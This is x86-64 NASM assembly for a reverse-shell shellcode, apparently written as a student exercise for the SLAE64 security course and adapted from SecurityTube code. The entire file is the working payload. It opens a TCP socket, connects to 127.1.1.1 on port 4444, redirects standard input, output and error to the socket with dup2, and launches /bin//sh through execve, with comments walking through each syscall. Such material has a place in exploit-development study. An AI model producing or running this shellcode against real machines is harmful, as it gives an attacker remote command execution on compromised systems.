;--------------------------------
; RevShell-adjusted.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE64-1439
; November 8, 2016
; Original code by:
; Vivek Ramachandran
; SecurityTube
;-------------------------------

global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	xor rax, rax
	mov al, 41
	xor rdi, rdi
	add dil, 0x2
	xor rsi, rsi
	inc rsi
	xor rdx, rdx
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.1.1.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax
	
	mov dword [rsp-4], 0x101017f
	mov word [rsp-6], 0x5c11	; 4444
	mov dword [rsp -0xa], eax
	mov byte [rsp-8], 0x2
	sub rsp, 8


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	xor rax, rax
	mov al, 42
	mov rsi, rsp
	xor rdx, rdx
	add rdx, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
	xor rax, rax
	mov al, 33
        xor rsi, rsi
        syscall

	xor rax, rax
        mov al, 33
        inc rsi
        syscall

	xor rax, rax
        mov al, 33
        inc rsi
        syscall



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

	xor rbx, rbx
        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
 
